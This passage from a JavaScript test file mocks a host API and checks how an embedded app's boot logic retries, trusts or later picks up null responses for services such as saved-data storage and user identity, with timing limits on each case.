  const user = { id: () => Promise.resolve('u_dan') };
  const ns = { db: { doc() {} }, user, sample: () => Promise.resolve({ text: '' }), mcp: null, downloads: null, permissions: null };
  const calls = {};
  ctx.claude = { use: (name) => new Promise((r) => {
    const n = calls[name] = (calls[name] || 0) + 1;
    const [ms, what] = answer(name, n);
    setTimeout(() => r(what === 'ns' ? ns[name] : null), ms);
  }) };
  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
  return { U: ctx.U, calls };
}

test('a null for saved work inside the viewer is asked again, and taken up when it comes (G2)', async () => {
  // Framed, db answers null at "10 s" (the host did not answer), then answers: boot waits for it.
  let { U, calls } = bootNulls((name, n) => (name === 'db' && n === 1 ? [100, null] : [1, 'ns']), { framed: true });
  await U.rt.ready;
  assert.ok(U.rt.db, 'asked again and got it');
  assert.equal(calls.db, 2);
  assert.deepEqual(plainObj(U.rt.late), []);
  assert.equal(U.rt.savedLate(), false);

  // Not framed, but the null took the host's 10 s: the same.
  ({ U, calls } = bootNulls((name, n) => (name === 'user' && n < 3 ? [100, null] : [1, 'ns'])));
  U.rt.NULL_SLOW_MS = 50;  // real ms here: the clock above runs 100 times fast
  await U.rt.ready;
  assert.ok(U.rt.user && U.rt.uid === 'u_dan', 'user, and then its id');
  assert.equal(calls.user, 3);

  // Not framed and a quick null (a page of its own, or a view without it): believed, not asked again.
  ({ U, calls } = bootNulls((name) => (name === 'db' ? [1, null] : [1, 'ns'])));
  await U.rt.ready;
  assert.equal(U.rt.db, null);
  assert.equal(calls.db, 1);
  assert.deepEqual(plainObj(U.rt.late), [], 'nothing late: "open this in the Claude app" is right here');

  // Framed, null at every ask until "45 s": boot opens at "30 s" saying it is still loading, keeps
  // asking quietly, and takes it up when it comes.
  const t0 = Date.now();
  ({ U, calls } = bootNulls((name) => (name === 'db' && Date.now() - t0 < 450 ? [100, null] : [1, 'ns']), { framed: true }));
  await U.rt.ready;
  assert.ok(Date.now() - t0 < 420, 'boot did not wait past 30 s');
  assert.equal(U.rt.db, null);
  assert.deepEqual(plainObj(U.rt.late), ['db']);
  assert.equal(U.rt.savedLate(), true);
  assert.equal(await new Promise((r) => U.on('rt-late', r)), 'db');
  assert.ok(U.rt.db, 'taken up when it arrives');
  assert.ok(calls.db >= 4, 'asked again and again: ' + calls.db);
  assert.deepEqual(plainObj(U.rt.late), []);
  assert.equal(U.rt.savedLate(), false);

  // Something optional that answers null is believed at once, framed or not.
  ({ U, calls } = bootNulls((name) => (name === 'mcp' ? [100, null] : [1, 'ns']), { framed: true }));
  await U.rt.ready;
  assert.equal(calls.mcp, 1);
  assert.equal(U.rt.mcp, null);
});
